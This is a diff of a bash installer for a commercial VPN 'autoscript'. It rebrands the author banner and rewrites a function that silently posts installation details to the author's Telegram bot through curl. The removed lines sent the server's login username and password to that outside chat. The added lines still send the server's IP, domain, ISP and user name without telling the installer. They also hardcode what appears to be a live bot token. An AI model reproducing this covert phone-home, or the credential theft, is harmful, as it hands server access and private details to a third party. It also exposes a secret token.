@@ -24,7 +24,7 @@ clear;clear;clear
 
   # // Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "  Auther : ${green}  SANZ VPN STORE ® ${NC}${YELLOW}(${NC} ${green} ANJAY POKONAMAH ${NC}${YELLOW})${NC}"
+echo -e "  Auther : ${green}  TUMBUNG VPN STORE ® ${NC}${YELLOW}(${NC} ${green} ANJAY POKONAMAH ${NC}${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
 sleep 2
@@ -300,25 +300,20 @@ sts="${Error}"
 fi
 TIMES="10"
 CHATID="5805800034"
-TIME="1"
-    URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi VPN Script Stable V3.0
-    ============================
-    <code>Tanggal    :</code> <code>$tanggal</code>
-    <code>Hostname   :</code> <code>${HOSTNAME}</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>OS Vps     :</code> <code>$OS_Name</code>
-    <code>Kernel     :</code> <code>$Kernel</code>
-    <code>Arch       :</code> <code>$Arch</code>
-    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
-    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
-    ============================
-    <code>Domain     :</code> <code>$domain</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>User Login :</code> <code>$Username</code>
-    <code>Pass Login :</code> <code>$Password</code>
-    <code>User Script:</code> <code>$username</code>
-    <code>Exp Script :</code> <code>$exp</code>
+KEY="6495450900:AAHaJpL7xOptW19plOrjmsRTHjjRK_gj2_8"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+    TIMEZONE=$(printf '%(%H:%M:%S)T')
+    TEXT="
+<code>────────────────────</code>
+<b>⚡AUTOSCRIPT PREMIUM⚡</b>
+<code>────────────────────</code>
+<code>User     :</code><code>$username</code>
+<code>Domain   :</code><code>$domain</code>
+<code>IPVPS    :</code><code>$MYIP</code>
+<code>ISP      :</code><code>$ISP</code>
+<code>Exp Sc.  :</code><code>$exp</code>
+<code>────────────────────</code>
+<b> 🇮🇩🇮🇩 TUMBNG VPN TUNNELING 🇮🇩🇮🇩</b>
 
     curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
